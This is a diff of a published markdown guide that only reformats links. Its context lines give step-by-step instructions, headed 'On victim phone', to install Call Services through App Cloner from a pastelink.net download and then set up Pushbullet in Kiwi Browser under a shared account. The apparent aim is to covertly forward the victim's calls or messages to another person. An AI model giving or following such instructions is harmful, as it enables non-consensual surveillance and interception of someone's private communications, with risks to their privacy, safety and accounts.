@@ -8,7 +8,7 @@ published: true
 `--- On victim phone ---`
 
 * Go to this link to Download Call Services & App Cloner
-   Link: https://pastelink.net/1jzq0
+   Link: [https://pastelink.net/1jzq0](https://pastelink.net/1jzq0)
 * Download both the apps and Install them.
 * Open App Cloner and Click on CLONED APPS.
 * Click on Call Services and Launch it.
@@ -23,7 +23,7 @@ published: true
 
 * Now Download Kiwi Browser (To use push bullet 
     extension on android) from playstore
-    Link: https://play.google.com/store/apps/details?id=com.kiwibrowser.browser
+    Link: [https://play.google.com/store/apps/details?id=com.kiwibrowser.browser](https://play.google.com/store/apps/details?id=com.kiwibrowser.browser)
 * Open Kiwi and search for pushbullet extension in the app and Add it.
 * Click on 3 dot menu and go to last tab【Pushbullet】
 * Login with same account and Start sending (  and 
